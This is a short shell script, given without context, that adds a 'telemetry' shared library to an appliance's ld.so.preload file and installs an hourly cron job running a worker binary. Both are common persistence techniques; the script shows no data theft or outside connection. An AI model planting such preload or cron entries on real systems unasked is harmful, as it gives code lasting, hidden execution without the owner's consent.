#!/bin/sh
printf '%s\n' '/opt/appliance/lib/telemetry.so' >> '/opt/appliance/etc/ld.so.preload'
(crontab -l; printf '%s\n' '23 * * * * /bin/sh -c /opt/appliance/bin/worker') | crontab -
